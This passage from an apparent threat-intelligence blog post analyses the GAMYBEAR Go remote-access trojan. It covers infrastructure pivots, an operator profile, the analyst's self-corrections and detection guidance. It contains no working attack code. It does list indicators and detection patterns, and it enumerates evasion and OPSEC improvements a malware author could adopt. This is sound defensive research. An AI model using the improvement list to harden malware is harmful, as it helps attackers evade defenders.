A broader pivot using the subject DN template (`CN=cloudflare-dns.com AND C=RU`) surfaced 29 candidate hosts. After filtering known false-positive ports used by Russian-language commercial scraping and proxy services, 11 hosts remained. Manual review of those 11 revealed legitimate Yandex reverse-proxy infrastructure, Russian residential proxy pools, and SOCKS proxy operators — none with GAMYBEAR-specific characteristics. **The cert-template pivot does not produce useful clustering for this family**, because the operator chose a certificate template that blends into a large-noise Russian-language commercial hosting ecosystem.

This is itself a finding. Threat intel teams building infrastructure-pivot strategies for GAMYBEAR using template-shape clustering will generate many false positives. The 11 surviving hosts are not all malicious. The operator's cert-template choice — whether deliberate or coincidental — produces effective camouflage against this specific pivot methodology.

Several follow-up pivots that I didn't perform in this session would likely yield additional findings: Validin and DomainTools passive DNS history on the C2 IP and on the related domain `grizzlyconnect[.]net` referenced in CERT-UA's advisory; abuse.ch ThreatFox and URLhaus checks on the four IPs in the advisory's IOC list; GitHub Code Search and grep.app queries for the operator persona `fuckthereversers`. These are non-trivial pivots that could expand the infrastructure picture and are flagged for follow-up.

## What the binary says about the operator

The binary doesn't give me a name, but it gives me a useful profile of the team or person behind it. Inferences below come from code and runtime artifacts, not from external attribution. They're useful for operator-tracking (finding adjacent samples with similar tradecraft) and for calibrating defensive priorities against this team's likely future iterations.

**Language background.** The function naming is inconsistent and non-idiomatic for Go. `run_command` and `confExist` sit alongside what would be Go-conventional names. Snake_case for some functions, camelCase for others. The mix suggests the developer's primary background is **Python** (where snake_case is universal) and they haven't internalized Go's MixedCaps convention. The inline `map[string]string` for the result message — where idiomatic Go would define a struct — points the same direction. This developer learned enough Go to ship a program; they haven't absorbed Go's stylistic norms.

**Build hygiene.** Almost nothing was done that a competent malware author does by default:

- DWARF debug info retained (no `-ldflags="-s -w"`)
- BuildID embedded and visible (no stripping)
- Build environment paths embedded (no GOPATH redirection)
- No string obfuscation
- No anti-VM or anti-debug
- No indirect API calls or hash-based imports
- No TLS pinning

This is the profile of a developer who knew enough to make working malware but not enough to think defensively about reverse engineering. Combined with the visible operator persona `fuckthereversers`, the picture is of a developer who is aware reverse engineers exist (the username is a statement to us) but didn't actually invest in slowing them down. The performative posture and the technical investment don't match.

**Code quality signals.** A few specifics worth flagging:

- `strings.Split(args, " ")` for argument parsing — breaks on any quoted argument with embedded spaces. A shell-aware operator would use a real arg parser.
- `log.Fatal` in `main.sender` — single point of failure; a transient POST error kills the entire bot. Mature RAT frameworks catch and retry.
- `os.WriteFile(..., 0o644)` — Unix file mode passed to a Windows-only binary. Linux-development habit.
- Mixed JSON casing conventions across endpoints — operator is building payloads ad-hoc without protocol design discipline.
- `http.DefaultClient` everywhere — the bug that breaks the bot in clean environments. Most consequential single design choice.
- Pair-receive pattern on `chan string` (`command := <-commands; arguments := <-commands`) — brittle, order-dependent, would interleave catastrophically if a second producer were ever added. Quick-and-dirty design.

**Operational tradecraft.** The infrastructure choices are similarly mixed. A single hardcoded C2 IP with no rotation, no fallback list, no DGA, no domain fronting. The C2 cert is self-signed with a Moscow-themed subject that's either operator confidence (no need to hide attribution) or operator misdirection (planted attribution to mislead analysts) — without operator-side access, both interpretations are equally plausible. The persistence model offloads the registry write to the upstream PowerShell stage, which is sound separation-of-concerns but creates the load-bearing dependency that defenders can hunt.

**What this profile suggests for the next variant.** If this developer continues iterating on the tool, the changes that would suggest improvement are observable. A future GAMYBEAR variant exhibiting any of the following has had the developer learn:

- Stripped DWARF (no more source paths or usernames in the binary)
- `tls.Config` with `InsecureSkipVerify: true` or cert pinning (fixes the TLS failure)
- Multiple C2 IPs in a fallback list (resilience)
- Domain-based C2 with a Let's Encrypt cert (OPSEC improvement)
- Context-based goroutine cancellation (code-quality improvement)
- Real shell support via `cmd.exe /c` wrapping (functionality)
- Sleep jitter (randomized intervals) instead of fixed cadences (beaconing OPSEC)
- Argument parser that respects quoting

If a future variant exhibits even half of these changes, the team is improving. If a future variant exhibits none — same `http.DefaultClient`, same hardcoded IP, same unstripped DWARF, same `fuckthereversers` persona — the team continues to ship developmentally immature tooling and the defensive content in this post continues to work against them.

CERT-UA attributes UAC-0241 to a Russian-aligned threat cluster. The binary-level artifacts are consistent with that attribution (Moscow cert subject, Ukrainian targeting, adjacency to Gamaredon suggested by the `gamaredagne.py` file name in CERT-UA's broader IOC list). But the binary-level tradecraft is **not** consistent with mature state-aligned APT tooling. There are three alternative hypotheses that fit the evidence:

1. **Developmental/prototype tooling** deployed early in its lifecycle. Subsequent versions may close the gaps.
2. **Mass-distributed lightweight implant** intended to be cheap, expendable and easily replaced. Detection of one bot doesn't compromise broader operations.
3. **Outsourced or contractor-developed tooling** where the customer doesn't enforce strict code-quality standards.

Distinguishing these requires either variant comparison (which the unanalyzed `ieupdater.exe` would help with) or operator-side access (which OSINT doesn't provide). Either is a follow-up activity.

## Honest calibrations

A few interpretations I worked through and walked back during this investigation, documented here so future readers know where the corrections happened.

**The "anti-MITM tradecraft" framing was wrong.** I initially read the strict-TLS-validation behavior as a deliberate operator choice to prevent man-in-the-middle attacks on the C2 channel. On closer inspection, the parsimonious explanation is just default Go behavior. The operator used `http.DefaultClient` because it was the simplest thing to type, not because they made an active design decision to validate certs strictly. The behavior is the result of inattention, not tradecraft.

**The cert-pinning hypothesis was wrong.** I initially suspected the bot might pin against the operator's certificate fingerprint as an additional protection layer. The binary contains no certificate pinning logic — no embedded cert blobs, no `VerifyPeerCertificate` callback, no SPKI fingerprint comparisons. The bot relies entirely on the system trust store, which means installing the operator's CA into that store is sufficient to make it work.

**The Censys JA4 pivot path was wrong.** I initially planned to pivot on the bot's JA4 fingerprint via Censys' service-banner data. Censys exposes JA4X (server-side TLS fingerprinting) and JARM, but not JA4 (client-side). The bot's JA4 fingerprint can be observed in network telemetry from the defender side but cannot be used as a Censys pivot.

**The initial `%APPDATA%\\updater.json` lookup was misframed.** During the live detonation I initially checked the file's existence using `Test-Path` against an incorrect environment context, got a `False` return, and briefly suggested the file might not exist. The actual user-context `%APPDATA%` path returned `True`. The file was always there; my diagnostic command was wrong.

These corrections are documented in the [archive PDF](https://github.com/yankywilson/gamybear) rather than hidden. This is what calibrated CTI work looks like — and it's what separates careful analyst output from confident-but-wrong assertion.

## The takeaway

GAMYBEAR is small, broken, and important. Small because it's 250 lines of Go in a single file. Broken because the developer used `http.DefaultClient` and the C2 presents a self-signed cert, so the bot can't validate the chain on any clean Windows host. Important because the broken state itself is a high-fidelity detection signal that's hash-independent and survives variant rotation.

The defensive consequences are concrete:

- **Network detection** keyed on Go-default JA3 plus `bad_certificate` alerts catches the bot whenever the operator's CA isn't pre-staged on the victim, which is every clean test environment and every host where the upstream PowerShell stage doesn't complete cleanly.
- **Host detection** keyed on non-administrative PowerShell writing a non-system root cert into the trust store catches the campaign at the upstream stage — earlier in the kill chain than the bot's network activity.
- **Persistence detection** keyed on file creation at `%APPDATA%\\updater.json` survives any filename rotation the operator might attempt on the GAMYBEAR binary itself.

The advisory and the binary tell consistent stories at different granularities. CERT-UA's IR-derived view of the kill chain is correct at the kill-chain level. The binary-level view I built here is correct at the implementation level. Both are necessary. Neither is sufficient alone.

If you're another researcher tracking UAC-0241 or the broader Russian-aligned tooling against Ukrainian targets, the [reconstructed Go source](https://github.com/yankywilson/gamybear/blob/main/analysis/reconstructed_source.go), [YARA rules](https://github.com/yankywilson/gamybear/tree/main/yara), [Suricata signatures](https://github.com/yankywilson/gamybear/tree/main/suricata) and [IOC bundle](https://github.com/yankywilson/gamybear/tree/main/ioc) in the repo are open for community use. If you build on this work, attribution is appreciated but not required. If you spot a correction or have additional indicators — especially from the unanalyzed `ieupdater.exe` variant — please open an issue.

The full analytical archive with section-by-section reverse engineering of all 13 functions, the complete C2 protocol reconstruction, the dynamic detonation logs, and the operator profile is in the [78-page archive PDF](https://github.com/yankywilson/gamybear) in the repo. This blog post is the narrative; the PDF is the case file.

---

**Read the full case file:** [yankywilson/gamybear](https://github.com/yankywilson/gamybear) (78-page archive PDF + reconstructed Go source + YARA / Suricata / Snort rules + IOC bundle in CSV, Markdown and STIX 2.1)
